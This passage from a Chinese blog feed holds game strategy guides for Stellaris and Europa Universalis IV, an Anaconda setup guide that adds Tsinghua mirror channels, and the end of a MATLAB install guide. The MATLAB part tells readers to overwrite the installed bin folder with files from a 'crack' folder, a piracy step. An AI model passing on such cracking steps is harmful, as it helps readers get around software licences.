href="#3-10-勾选添加快捷方式，点击下一步" class="headerlink" title="3.10 勾选添加快捷方式，点击下一步"></a>3.10 勾选添加快捷方式，点击下一步</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113811.png" alt="image-20200703113811025" title="image-20200703113811025"></p><h3 id="3-11-开始安装"><a href="#3-11-开始安装" class="headerlink" title="3.11 开始安装"></a>3.11 开始安装</h3><p>点击开始安装</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703113850.png" alt="image-20200703113848833" title="image-20200703113848833"></p><p>开始安装，耐心等待，四十分钟左右…</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703114356.png" alt="image-20200703114355274" title="image-20200703114355274"></p><p>安装完成，点击关闭</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703153450.png" alt="image-20200703153449013" title="image-20200703153449013"></p><h3 id="3-12-打开-crack-文件夹"><a href="#3-12-打开-crack-文件夹" class="headerlink" title="3.12 打开 crack 文件夹"></a>3.12 打开 crack 文件夹</h3><p>复制其下的 R2020a 里的 bin 文件夹至安装目录进行替换</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703153734.png" alt="image-20200703153733097" title="image-20200703153733097"></p><h3 id="3-13-发送快捷方式"><a href="#3-13-发送快捷方式" class="headerlink" title="3.13 发送快捷方式"></a>3.13 发送快捷方式</h3><p>此步骤自行查看桌面是否有快捷方式，如没有执行如下操作。再次打开软件安装目录，打开 bin 文件夹，右键发送快捷方式至桌面</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703153944.png" alt="image-20200703153943106" title="image-20200703153943106"></p><h3 id="3-14-打开软件"><a href="#3-14-打开软件" class="headerlink" title="3.14 打开软件"></a>3.14 打开软件</h3><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703154332.png" alt="image-20200703154330909" title="image-20200703154330909"></p><p>主页面：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200703154550.png" alt="image-20200703154549110" title="image-20200703154549110"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门指南 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>群星实战打法之一——早战篇(止步2.8)</title>
      <link href="/1630.html"/>
      <url>/1630.html</url>
      
        <content type="html"><![CDATA[<p>介于群星目前进几个版本来看，早战打法，这个看上去比较另类的打法在群星游戏机制的加成上，展现了其强大的滚雪球能力。而其对立的种田就显得毫无面子可言。这里，简单讲解一下早战的打法。</p><p>这次讲早战，下次讲种田。</p><p>首先：<br>明确群星最为重要的一点：科技是第一生产力。</p><p>开局前提：ai数量拉满，开全高级ai，高侵，递增难度关。</p><p>思潮：极端唯物，威权;<br>国策：技术治国，奴贩工会</p><p>早战：顾名思义，就是当个战狂。这是一种以战养战的打法。由于群星没有后勤保障这一对目前来讲极其重要且不可忽略的概念，使得早战不需要管后方只需要制定好进攻方向即可。</p><p>开局第一步，暂停（废话），依次关停合金厂和官僚，并替换成民用工厂。</p><p>关合金厂是为了省出更多的矿尽可能造出科研区划。<br>民用工厂是为科研区划中的科研人员提供维护费。</p><p>Q：那没有合金造不了科研船啊？<br>A：第二步会解释。</p><p>Q：为什么不同时关？<br>A：失业人口多了容易刷犯罪狂潮debuff。</p><p>第二步：进入舰船设计界面，拆掉所有的武器装甲和引擎，让舰队升级，省合金。</p><p>此举可以提供132+的合金，配合开局的100合金刚好三科研开局。</p><p>Q：那ai来打你怎么办？<br>A：后文会讲。而且，三艘护卫能挡得住什么ai？</p><p>第三步：政策——经济——民用经济（+25%消费品产出，-25%合金产出），科研向外探图，选择探索而不是调查。</p><p>增加消费品产量，可以挤出一两个人口再去搞科研;因为一般情况下不自产合金（在前期矿电均紧张的情况下），所以合金减产影响不大。<br>探索加快找到ai的速度，调查会严重拖慢进度。</p><p>第四步：探到第一个ai之后<br>1、非灭绝种族（宣战有全战借口），如果不是不信任的态度，就算一个良好的开端了。<br>2、铁心，同化，蜂群，种族洁癖（非同一种族），如果没有接壤，还有可以挽救的余地;不然的话，重开吧，没救了。</p><p>Q：之前为什么不自产合金造船防止被宣？<br>A：如果说真的要维持舰队的话，起码要三个以上的合金厂，而开局矿根本没办法支付如此昂贵的月矿。<br>其次，矿需要累积起来尽可能快速地造出第一个科研区划（600天建造时间）。其建造时间之长愈发能体现出停掉合金厂省矿的重要性。尽早造出第一个科研对科技来讲提升的速度是非常明显的。</p><p>如果第四步出现第二种情况，建议重开，不建议继续，变数太大。</p><p>第五步：贸易<br>这将会是合金的主要来源。<br>相比国内市场，和ai贸易会显得划算许多。<br>国内1苹果&#x3D;0.7电，ai这里可能在1苹果&#x3D;2+的电左右的兑换比例。</p><p>这个时候，环开又一优势出现了：开局超高的食物产出。<br>开局自带的一个农业区划为前期贸易提供了极为优良的条件。月产100+食物，可以很好地贸易出消费品消耗的月矿和各方面缺乏的资源。</p><p>贸易还可以白嫖：有个外交支持选项，可以获得10*贸易比例*外交支持数量的贸易接受度。</p><p>第六步：爆船<br>此前的所有步骤都是为了快速形成战斗力而服务。<br>在第九年—第十一年左右，传统至高线是可以关门的。在关门之前，提前两年左右将星港的槽位造成两个船坞，用前几年贸易出的合金爆出40艘护卫。如果不打算点星际主权，如果传统线已经点出了+20指挥上限和造船buff的两个，已经可以直接打了。</p><p>Q：宣称影响力不够怎么办？<br>A：宣称尤其需要注意一点：只宣称有殖民球的星系。每个星系都宣肯定是不够的，而且开战后还要打下宣称星系才能胜利。</p><p>第七步：战斗<br>此时，40护卫的维护费在没有贸易的情况下是赤字。正常情况下，农夫也都升级搞科研去了。此时出现了一个需要注意的要点：负电运营。</p><p>负电运营原理：<br>群星的结算是每个月的一号结算资源，但由于资源产生的buff是在二号生效。也就是说，在每月的一号结算后再购入电，是不会吃战力减半的debuff。<br>但是，新人这么做是很难的，因为没有对应的意识，很难对时间有较好的把控。</p><p>地图层面操作步骤基本如此。</p><p>科技&amp;传统&amp;飞升：<br>科技：物理和工程学是主要线路，不仅仅是因为有机飞的必须科技，保障资源以及解锁稀有资源、新型武器的科技基本全部包含在内。</p><p>我这里有2.7.x版本的科技树全图，但由于制作组的原因不允许外传，想要的可以加群：874284014</p><p>几个重要的科技（以前期为基础条件，仅限T1—T2）：<br>物理：蓝激光、聚变反应堆、管理型人工智能（飞升科技）、自我演化逻辑（飞升科技）。<br>这四个是前期出得越早越好的科技，对早战和飞升而言极其重要。</p><p>社会学：行星统一、殖民集中<br>社会学对于机飞而言并不是很重要，在点完这两个后再完成“星系管理”（T3）就算社会学毕业了。</p><p>工程学：动力外骨骼、机器人、智能人（三个机飞科技）、异星天然气厂。<br>这里不是说舰船解锁科技线不重要，而是因为除了护卫和战列，其它的船都太拉胯了，而战列属于T4级别的科技，解锁时间要求长，而且整条舰船科技线会多出许多奇奇怪怪的分支，降低抽中关键科技的概率。</p><p>传统：<br>既然是早战，传统首发肯定是与战斗有关的至高，没有什么好说的。</p><p>飞升：觉得自己缺影响力的可以选星际主权，帝国规模debuff太严重选帝都特权，想加快传统线点万众一心。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> P社 </tag>
            
            <tag> 群星 </tag>
            
            <tag> 攻略 </tag>
            
            <tag> 早战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【欧陆风云4】黄埔兵书 之 综合国力篇</title>
      <link href="/125.html"/>
      <url>/125.html</url>
      
        <content type="html"><![CDATA[<p>玩家之间的对决，毫不过分的说就是一场综合国力的较量。</p><p>综合国力包含主要四大要素：</p><ul><li>经济：收入及存款、贷款上限</li><li>军事：科技及理念、兵种、加成 buff</li><li>陆军：现役规模及上限、库存人力、职业度</li><li>其他：君主点数、险要地势、关键要塞、ai 盟友</li></ul><h2 id="经济直接于战争上的应用"><a href="#经济直接于战争上的应用" class="headerlink" title="经济直接于战争上的应用"></a>经济直接于战争上的应用</h2><blockquote><p>经济基础决定上层建筑，没有经济就没有资格与敌人公平较量。经济主导你军队作战强度规模及可持续时间，决定是否做好作战充分准备（比如上限及人力建筑、要塞军队状态、练兵职业度），间接拉开彼此科技理念进程（顾问差异的点数），影响你的国家扩张发展。</p></blockquote><p>可以换掉当前不满意的顾问、升级高级顾问。{点数越多可以领先科技或理念、种军事点提高基础人力、招募神将军、用于炮兵破城墙、开启战争税、急行军（15 行政科技后）等等}；</p><p>养兵千日用兵一时，可长期高上限备战养兵、练兵；</p><p>大量建设兵营及军营，增加后备人力及上限数量；</p><p>使用昂贵的雇佣兵，用于围城或充当前排可以省人力；（注意招募雇佣兵会掉陆军职业度）</p><p>接受 ai 的雇佣军团，相当于增加你的军队数量；</p><p>向卫戍国派遣军官，小弟军队有训练度跟士气加成，数量较多还可以支援战场起到关键性作用；</p><p><img src="https://cos.gjcloak.xyz/pigo/202208171945370.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>存款越多可以免受贷款利息，也是一个国家战时战后可持续发展与扩张的重要保障，额外还提高并振奋个人信心和打击敌对玩家士气；</p><p>贷款上限决定死战不休的战争双方谁将最后胜利、延续战争年限，甚至还可以使用破产铺地手段（该手段请视情况使用，否则万国来朝）。</p><h2 id="军事方面对战争上的应用"><a href="#军事方面对战争上的应用" class="headerlink" title="军事方面对战争上的应用"></a>军事方面对战争上的应用</h2><p>很多欧陆玩家都有普鲁士铁血情怀，喜欢玩普鲁士崛起，因为这个国家理念及政体特别强，但是经济比较脆弱，所以很少联机档能看到普鲁士霸权。</p><p>这里说的军事方面包含科技等级、自身国家理念、理念组、兵种、以及各种 buff 加成。</p><h3 id="科技等级"><a href="#科技等级" class="headerlink" title="科技等级"></a>科技等级</h3><p>科技等级十分重要，落后一级军科可能有灭顶之灾、亡国之危， 先行一级军科可以是决定往后 100 年的国家兴盛。但并非科技越前越好，还的看收益，点数还有其他大用，但起码不要落后于身边非盟友玩家。</p><p>（1） 前期联机玩家基本都是焦点军事，目的是尽快升级 4 军科， 可以增加陆军士气，然后宣战比较有挑战性的 ai。</p><p>（2） 中期的 15 军科的+1 士气也十分关键，很多的联机案例就是因为落后这一级科技，士气被碾压导致被瓜分亡国。</p><p>（3） 新增炮兵兵种的 7 级科技也关键（特别是奥斯曼），可以用炮兵围城，加上乌尔班大炮时代buff，围城十分快，因为打仗不仅要胜，还要下城（有要塞的），最主要要塞有防御地形加成，围下敌方的一个关键山脉要塞，战争的主动权就可以掌握在你手里。</p><p>（4） 换兵种的科技十分关键，特别是前期换步兵后期换炮兵。但是要注意换兵种会清空该兵种士气，要保证自身军队的安全。换兵种的时机可以选择在和平时期、大决战之后，有自身要塞的防护下。</p><p>（5）5 级行政科技及 10 级行政科技也至关重要。5 级行政科技可以开第一条理念组，一般联机前三发理念先后顺序为数量、经济、质量。数量理念组拥有 20%人力恢复，越早解锁，还拥有陆军规模修正+50%。10 行政科技开启第 3 条理念组，目的尽早国家理念关门，享受政策。此外西班牙俄罗斯应早点成立，防止被卡变身。</p><h3 id="理念"><a href="#理念" class="headerlink" title="理念"></a>理念</h3><p>理念分为国家自身理念及理念组。</p><p>每个主流国家的自身理念都不一样，各有各的特色。日常联机看到从其他国家变身更改理念组的有普鲁士，印度斯坦，爱尔兰。因为这三个变身后的国家陆军质量都会增强。还有就是变身西班牙俄罗斯理念都会变化。</p><p>越早完全解锁三组理念让国家理念关门是越快越好。</p><p>国家自身理念有一般常见的有+士气；+训练；+火力；+兵种作战能力；+人力恢复；+雇佣军数量。都是相当不错的加成。早点拥有这些相当于手上增加了一个法宝。</p><p>理念组比较多，我们在这不讨论哪个理念组的好坏，因为人人玩法风格迥异，没有最好，只有最适合。</p><p>从 1.15 联机至今，受版本跟 dlc 影响，以前首发质量、进攻、防守或数量的军事理念都有，后来有了直辖跟昂贵的雇佣军后，主流陆军大国更趋向于首发数量二发经济三发质量四发革新或贸易，从军力来说主要围绕人力恢复、陆军上限、开发种地、增加训练度、步兵作战能力跟省钱省点数。出保十分危险的国家（被玩家宣战）适当可以首发防守。</p><p>以上国家自身理念及理念组都是构成国力的重要因素。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>兵种、以及各种buff：</p><ul><li>加成前期游牧骑兵、安纳托利亚兵种、穆斯林兵种都很强。对应有优势的国家可以发 挥自身的兵种优势，发挥这种隐藏的国力。</li><li>炮兵在同科技下全世界国家基础数据是一样的。在特定时期兵种会劣势的国家更应该 利用炮兵的作用。</li></ul><p>还有各种途径加成战斗 buff：</p><ul><li>任务树：典型的代表就是卡卡、帖木儿。</li><li>时代加成：典型的代表是奥斯曼（乌尔班大炮）、西班牙（大方阵）、法兰西（火枪手）、大清（八旗）、普鲁士（铁军） 等等专属国家的加成，还有些普通的时代点数加成 buff。</li><li>黄金时代：+10%士气</li><li>政府改革：代表有南印度文化国家。+训练及步兵作战能力</li><li>事件加成： 事件+训练度、军改+士气</li><li>专制时代：专制度+训练度</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202208171948615.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p><img src="https://cos.gjcloak.xyz/pigo/202208171949237.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>上述各种加成均构成单兵作战质量，是国家国力的组成部分，有些是长期的，有些是在特殊时代的，有些是在一个固定期限内的。这里只做普及至于如何获取暂不探讨，如果有加入群的可向有才的群员咨询或网上贴吧看帖。有了这些buff 就感觉士兵都有了光环。</p><h2 id="陆军的几大要素"><a href="#陆军的几大要素" class="headerlink" title="陆军的几大要素"></a>陆军的几大要素</h2><blockquote><p>现役规模及上限、人力、职业度</p></blockquote><p><img src="https://cos.gjcloak.xyz/pigo/202208171950631.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p><strong>陆军规模及上限</strong>越高说明该国陆军数量越多。数量上的优势不论在战术上还是战略上都是最普遍的制胜因素，主要受省份的数量、自治度、建筑物+ 附庸加成+增加理念%决定。</p><p>平时现役军队一般不超过规模上限，因为有陆军维护费惩罚， 在准备作战前只要实力允许，可以实现 200%陆军上限规模暴兵， 经过战役后即时合并。但早期打架不建议这么做，因为经济实力不允许的情况下容易破坏国家经济。当中后期你视金钱如粪土的时候可以尝试一波（卡卡变身西班牙后，收编阿拉贡军队会有一波数量增加可以利用）。</p><p><strong>人力</strong>：人力在如今版本中显得格外重要。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208171951833.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>为什么大家喜欢用军事点去种地，因为对人力爱的深沉。</p><p>种军事点可以提高人力恢复跟人力上限，还有理念也可以提供增益，另外省份法令也可以提高人力恢复。当大战在即，人力必然紧缺，省份除边境堡垒开启防御法令外，都有必要对省份法令进行切换。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208171951918.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p><strong>陆军职业度</strong>：为你的陆军提供战斗力加成，也可以换取（招募） 后备兵员。越高的陆军职业度提供的buff 越多，消耗 5 个职业度可 以换取你 24 个月的人力恢复总量。</p><p>增加的方式主要有军队操练、军事点招募将军、攻下城后触发的事件、3 种事件（加减阶级忠诚兵叛乱可+2.5、花钱邻国可+5、平白无故自大+3）。</p><p>但是记住招募雇佣兵会自动降低你的职业度。</p><p><img src="https://cos.gjcloak.xyz/pigo/202208171952422.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>上述各因素都是国力的体现，至于如何发挥他的效用起到厚积薄发的效果，就看个人的实战经验。譬如打一个无关痛痒的国家花掉你积攒上百年的陆军职业度那就亏大咯。</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>国力的另外几个要素包含君主点数、险要地势、关键要塞、ai 盟友。</p><p>君主点数大家都理解，欧陆风云&#x3D;点数风云。虽失偏颇，但也不为过。谁能抗拒 666 的诱惑呢。最典型的代表就是开局 646 的奥斯曼，胡斯的波西米亚，选当地贵族的波兰，还有意大利的佛罗伦萨。点数虽然不是一切，但点数可以创造一切。看到玩家有神君继承人，不用慌，除了派遣训练有素的医生对其至于最崇高的问候以外，如果他不是你的盟友就不要以他为敌吧。</p><p>险要的地势也是国力的一种体现。被上岛的英国，被割走比利牛斯山的西班牙，防御能力下降，国力也随着下降。所以拥有险要地势的国家可以好好利用发挥其地利。除了英国的海峡西班牙的比利牛斯山还有意大利的阿尔卑斯山、奥斯曼的国王属地、印度的卡拉特山、法国的低地树林都是十分关键的险要地形，堪比天下无敌的大明山海关。</p><p>当然拥有这些险要地形以外，还是需要在上面建设要塞。没有要塞相当于一颗地雷，受伤的有可能是你，而建立要塞相当于筑起了一道著名的无敌马其诺防线。</p><p>Ai 盟友是不是你的国力体现呢，答案是很明显的。前期奥斯曼拉黑羊打麻木，黄牛拉摩腊婆打蓝牛，奥皇拉匈牙利或其他 ai 打架， 这都充分说明了 ai 盟友确实有很大的帮助。利用好你的 ai盟友，前期可以使你事半功倍。</p><p>讲完这么多，总结起来打仗就是打的就是综合国力。</p><p>那么下一篇将讲讲详细的军队操作要领。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 综合国力篇 </tag>
            
            <tag> 黄埔兵书 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【欧陆风云4】黄埔兵书之序言</title>
      <link href="/54.html"/>
      <url>/54.html</url>
      
        <content type="html"><![CDATA[<p>欧陆风云4 是一款特别好玩的策略游戏。包含有很多的治理国家的指令，几十个不同主流国家的不同扩张道路、吃地 ae、外交策略、贸易路线、阶级互动、任务树怎么点、理念组的选择、宗教组 buff 的使用、基础物的建设、点数种地、配兵打仗等等，要完全弄懂游戏机制跟每个国家的玩法是不现实的，但万变不离其宗，会玩欧陆风云内的一两个国家后，其他国家基本玩起来也没太大问题。</p><p>喜欢联机的玩家越来越多。随着游戏系统的不断完善加之有汉化组的不懈努力，入坑并喜欢欧陆风云4 联机的玩家越来越多，其间不断有联机群的组建并联机，由于联机过程中难免会有 PVP 的出现，有些刚步入欧陆联机的“萌新”被老玩家欺负、遇到玩家围攻、背叛而影响游戏体验， 甚至对联机产生反感之意，心想还不如自己跟电脑玩更简单更有乐趣。</p><p>联机的条件相对苛刻。需要多个拥有稳定时间的人约定好相应时间同时在线，并且需要一位顺畅的主机以及一套合理的联机规则；联机玩家间也因个性不同及水准各异，受国家利益影响，外交尔虞我诈，国力差异甚大，甚至其他国家对你的战争主谋却是你盟友。内鬼无处不在， 正义犹如白菜。整个战局不知不觉间进入春秋战国的纷争时代。</p><p>学会了在欧陆行军打仗，电脑都是些插标卖首之众。但是与玩家对战， 犹如徐达遇韩信、岳飞碰李靖，但也有些再现赵括会白起、章邯对项羽，致使联机过程中演绎一场绝无仅有的国家对抗及阵营抗衡。</p><p>本次编写《黄埔兵书》纯属为广大玩家普及欧陆联机打仗常识及技巧。本书由Yesman编写，最终解释权归Yesman所属。万国志内容由广大群友大佬提供。纯属娱乐，不喜勿喷。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 欧陆风云4 </tag>
            
            <tag> 黄埔兵书 </tag>
            
            <tag> 序言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Anaconda 入门指南</title>
      <link href="/53.html"/>
      <url>/53.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、下载安装-Anaconda"><a href="#一、下载安装-Anaconda" class="headerlink" title="一、下载安装 Anaconda"></a>一、下载安装 Anaconda</h2><p>1、下载地址：<a href="https://www.anaconda.com/products/individual">Anaconda</a></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200528104836.png" alt="image-20200528104813205" title="image-20200528104813205"></p><p>推荐下载 python3 版本。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200528105150.png" alt="image-20200528105149268" title="image-20200528105149268"></p><p>2、安装 Anaconda</p><p>按照安装程序提示一步步安装就好了, 安装完成之后会多几个应用：</p><ul><li><strong>Anaconda Navigtor</strong> ：用于管理工具包和环境的图形用户界面，后续涉及的众多管理命令也可以在 Navigator 中手工实现。</li><li><strong>Jupyter notebook</strong> ：基于 web 的交互式计算环境，可以编辑易于人们阅读的文档，用于展示数据分析的过程。</li><li><strong>qtconsole</strong> ：一个可执行 IPython 的仿终端图形界面程序，相比 Python Shell 界面，qtconsole 可以直接显示代码生成的图形，实现多行代码输入执行，以及内置许多有用的功能和函数。</li><li><strong>spyder</strong> ：一个使用 Python 语言、跨平台的、科学运算集成开发环境。</li></ul><h2 id="二、配置环境变量"><a href="#二、配置环境变量" class="headerlink" title="二、配置环境变量"></a>二、配置环境变量</h2><p>如果是 windows 的话需要去 <code>控制面板\系统和安全\系统\高级系统设置\环境变量\用户变量\PATH</code> 中添加 anaconda 的安装目录的 Scripts 文件夹，比如我的路径是<code>D:\developer_tools\python3\Anaconda3\Scripts</code>，看个人安装路径不同需要自己调整。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200528110349.png" alt="image-20200528110347519" title="image-20200528110347519"></p><p>之后就可以打开命令行(最好用管理员模式打开) 输入 <code>conda --version</code></p><p>如果输出<code>conda 4.8.2</code>之类的就说明环境变量设置成功了。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200528111113.png" alt="image-20200528111112375" title="image-20200528111112375"></p><p>为了避免可能发生的错误，我们在命令行输入<code>conda upgrade --all</code> 先把所有工具包进行升级。</p><h2 id="三、管理虚拟环境"><a href="#三、管理虚拟环境" class="headerlink" title="三、管理虚拟环境"></a>三、管理虚拟环境</h2><p>接下来我们就可以用 Anaconda 来创建我们一个个独立的 Python 环境了。接下来的例子都是在命令行操作的，请打开你的命令行吧。</p><h3 id="1-activate"><a href="#1-activate" class="headerlink" title="1. activate"></a>1. activate</h3><p>activate 能将我们引入 anaconda 设定的虚拟环境中，如果你后面什么参数都不加那么会进入 anaconda 自带的 base 环境。</p><p>你可以输入 python 试试，这样会进入 base 环境的 python 解释器，如果你把原来环境中 python 环境去除掉会更能体会到， 这个时候在命令行中使用的已经不是你原来的 python 而是 base 环境下的 python。而命令行前面也会多一个<code>(base)</code> 说明当前我们处于的是 base 环境下。</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200528120616.png" alt="image-20200528120615920" title="image-20200528120615920"></p><h3 id="2-与-pycharm-连接"><a href="#2-与-pycharm-连接" class="headerlink" title="2. 与 pycharm 连接"></a>2. 与 pycharm 连接</h3><p>在工作环境中我们会集成开发环境去编码，这里推荐 JB 公司的 pycharm，而 pycharm 也能很方便的和 anaconda 的虚拟环境结合。</p><p>在<code>Setting =&gt; Project =&gt; Project Interpreter</code> 里面修改 Project Interpreter , 点击齿轮标志再点击 Add Local 为你某个环境的 python.exe 解释器就行了。</p><h2 id="四、使用-Jupyter-notebook"><a href="#四、使用-Jupyter-notebook" class="headerlink" title="四、使用 Jupyter notebook"></a>四、使用 Jupyter notebook</h2><p>方便检查数据</p><p>官网：<a href="https://jupyter.org/">https://jupyter.org/</a></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531132633.png" alt="image-20200531132632083" title="image-20200531132632083"></p><p>启动 <code>Jupyter notebook</code></p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531180131.png" alt="image-20200531180130207" title="image-20200531180130207"></p><p>然后会看到下面：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531180155.png" alt="image-20200531180154403" title="image-20200531180154403"></p><p>自动跳转打开 127.0.0.1:8888&#x2F;</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531180527.png" alt="image-20200531180526658" title="image-20200531180526658"></p><p>新建 Python3 进行代码编写：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531180656.png" alt="image-20200531180654772" title="image-20200531180654772"></p><p>然后跳转至下面页面：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200531180816.png" alt="image-20200531180814664" title="image-20200531180814664"></p><p>加速使用 Jupyter notebook</p><h2 id="五、添加清华镜像至Anaconda仓库"><a href="#五、添加清华镜像至Anaconda仓库" class="headerlink" title="五、添加清华镜像至Anaconda仓库"></a>五、添加清华镜像至Anaconda仓库</h2><p>运行以下命令，将清华镜像添加至Anaconda仓库中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span><br><span class="line"></span><br><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/</span><br><span class="line"></span><br><span class="line">conda config --set show_channel_urls yes</span><br></pre></td></tr></table></figure><p><code>Conda</code> 是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。</p><h3 id="Conda-Forge"><a href="#Conda-Forge" class="headerlink" title="Conda Forge"></a>Conda Forge</h3><p><code>conda-forge</code>是可以安装软件包的附加渠道，为了建立和维护软件包而发起的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/</span><br></pre></td></tr></table></figure><h3 id="msys2"><a href="#msys2" class="headerlink" title="msys2"></a>msys2</h3><p>MSYS2 （Minimal SYStem 2） 是一个MSYS的独立改写版本，主要用于 shell 命令行开发环境。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/</span><br></pre></td></tr></table></figure><h3 id="bioconda"><a href="#bioconda" class="headerlink" title="bioconda"></a>bioconda</h3><p>BioConda是Conda专门为生信开的一条通道，里面有非常多的软件，可以直接安装。Bioconda的优点是安装简单，各个软件依赖的环境一同打包且相互隔离，非常适合在服务器中建立自己的生物信息分析环境。<strong>后期更新，生信是重点！</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/</span><br></pre></td></tr></table></figure><h3 id="menpo"><a href="#menpo" class="headerlink" title="menpo"></a>menpo</h3><p>menpo是python的一个程序包，使图片和网格数据的输入、处理、可视化尽可能的简单，适合处理带标注的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/</span><br></pre></td></tr></table></figure><h3 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a>pytorch</h3><p>PyTorch是一个开源的Python机器学习库，基于Torch，用于自然语言处理等应用程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门指南 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Anaconda </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欧陆风云4汉化mod安装教程</title>
      <link href="/52.html"/>
      <url>/52.html</url>
      
        <content type="html"><![CDATA[<p>安装开始之前，你需要准备好有游戏本体和对应版本的汉化mod。</p><p>如果你没有的话，可以前往<a href="/1806.html">这里</a>下载汉化，<a href="/1591.html">这里</a>下载双子节文件。</p><blockquote><p>特别需要注意的：双子节的版本需要与游戏版本一致，否则会出现闪退等现象</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本教程使用的汉化mod版本为：1.29.2</span><br><span class="line">新版本双子节文件可能会比本文截图更多，不过无妨，仍可以使用本文方法进行汉化</span><br><span class="line">同时P社也可能出现单纯“更新”版本行为，这种情况下汉化依旧就能用，双子节需要更新</span><br></pre></td></tr></table></figure><h3 id="汉化mod"><a href="#汉化mod" class="headerlink" title="汉化mod"></a>汉化mod</h3><p><img src="https://cos.gjcloak.xyz/file/1.29.2%E6%B1%89%E5%8C%96mod.png" alt="1.29.2汉化mod"><br>如果是创意工坊订阅的汉化，可以无须准备汉化mod包，直接订阅，然后</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>先运行一次英文原版游戏，不需要打开游戏，只需要启动器启动了就可以。然后关闭；</li></ol><p><img src="https://cos.gjcloak.xyz/file/%E6%B8%B8%E6%88%8F%E6%9C%AC%E4%BD%93%E7%89%88%E6%9C%AC.png" alt="游戏本体版本"></p><p><img src="https://cos.gjcloak.xyz/file/%E5%90%AF%E5%8A%A8%E5%99%A8.png" alt="启动器"></p><ol start="2"><li>打开我的文档中的Paradox Interactive\Europa Universalis IV\mod文件夹，mod文件夹的上级目录的情况如下图，如果没有mod文件夹就自己创建；</li></ol><p><img src="https://cos.gjcloak.xyz/file/%E6%88%91%E7%9A%84%E6%96%87%E6%A1%A3%E8%B7%AF%E5%BE%84.png" alt="我的文档路径"></p><ol 